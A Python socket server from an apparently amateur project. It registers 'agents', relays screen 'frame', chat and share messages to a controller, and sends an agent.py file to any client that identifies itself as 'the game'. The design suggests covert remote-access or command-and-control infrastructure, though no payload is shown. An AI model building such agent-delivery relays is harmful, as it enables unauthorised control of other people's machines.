"""
yotam sahvit project server
project name: unknown
"""
import socket
import sys
import threading

from message import *
from vuls import *


class Server:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connections = {}  # a dictionary of connections {name:socket}
        self.is_running = True

    def bind(self):
        """
        binds to a client
        :return:
        """
        try:
            self.server_socket.bind((self.ip, self.port))
        except socket.error as msg:
            print('Connection failure: %s\n terminating program' % msg)
            sys.exit(EXIT)

    def listen(self):
        """
        listens to one clienet
        :return:
        """
        self.server_socket.listen(SEND_TO_SOCKET)

    def accept(self):
        """
        accepting and starting a thread,
        calling the handle client method
        :return:
        """
        done = False
        while done is False:
            client, address = self.server_socket.accept()
            client_thread = threading.Thread(target=self.handle_client,
                                             args=(client, address))
            client_thread.start()
        self.server_socket.close()

    def run(self):
        """
        call the methods that runs the socket
        :return:
        """
        self.bind()
        self.listen()
        self.accept()
        self.is_running = True

    def handle_client_msg(self, client, msg):
        """
        match the message to the
        correct method, checks if the
        message is from the game, if it is
        call the send agent method
        :param client:
        :param msg:
        :return:
        """
        if msg == 'g':
            return self.send_agent(client)
        msg_id = msg.get_id()
        print("got msg ", msg_id, threading.current_thread())
        match msg_id:
            case "login":
                self.handle_login(client, msg)
            case "share":
                self.handle_share(client, msg)
            case "chat" | "frame":
                self.handle_proxy(client, msg)
            case "get-agents":
                self.handle_get_agents(client, msg)
            case "stop-share":
                self.handle_stop_share(client, msg)
            case _:
                print("unknown msg: " + msg_id)

    def handle_stop_share(self, sock, msg):
        """the gui calls this method when
        pressing the stop share button
        the method sends a stop share message
        """
        peer = msg.peer
        print("stop share req to ", peer)
        self.connections[peer].sendall(msg.pack())

    def send_binary_data(self, sock, data):
        """
        a method that clain a socket and a data
        and send the data to the socket encrypted
        """
        l = len(data)
        ll = str(l)
        lll = ll.zfill(MSG_LEN_PROTOCOL)
        llll = lll.encode()
        sock.send(llll + data)

    def send_agent(self, client):
        """
        sends the agent.py file
        :param client:
        :return:
        """
        f1 = open("c:\\Myproject\\agent.py", "rb")
        chunk = f1.read(CHUNKS)
        while chunk != b"":
            self.send_binary_data(client, chunk)
            chunk = f1.read(CHUNKS)
        self.send_binary_data(client, EOF)
        f1.close()

    def handle_get_agents(self, client, msg):
        """
        send to the controller all the
        agents that connected
        :param client:
        :param msg:
        :return:
        """
        ls = str(self.connections.keys())
        print(ls)
        response = GetAgentsResponse(ls, msg.sender)
        client.sendall(response.pack())

    def handle_proxy(self, client, msg):
        """
        in case there will be a chat
        :param client:
        :param msg:
        :return:
        """
        print("proxy ", msg.msg_id, " from ", msg.sender, " to ", msg.peer)
        self.connections[msg.peer].sendall(msg.pack())

    def handle_client(self, client_socket, _):
        """
        or each thread, recives a message using
        recv method in messages
        and the using the handle client method
        :param client_socket:
        :param _:
        :return:
        """
        done = False  # todo: fix loop
        while not done:
            # try:
                msg = recv(client_socket)
                if msg == '':
                    break
                self.handle_client_msg(client_socket, msg)
        #     except Exception as client_exception:
        #         print("handle client error ", client_exception)
        #         done = True
        # client_socket.close()

    def handle_login(self, client, msg):
        """
        prints the login id and adds to the dictionary
        of connections
        :param client:
        :param msg:
        :return:
        """
        print("login from " + msg.sender)
        self.connections[msg.sender] = client

    def handle_share(self, client, msg):
        """
        sends a share response that confirms
        the share and sends a share message to the
        correct agent
        :param client:
        :param msg:
        :return:
        """
        print("share req to ", msg.peer)  # todo: check if ok
        self.connections[msg.peer].sendall(msg.pack())


def main():
    s = Server("0.0.0.0", SERVER_PORT)
    s.run()


if __name__ == '__main__':
    main()
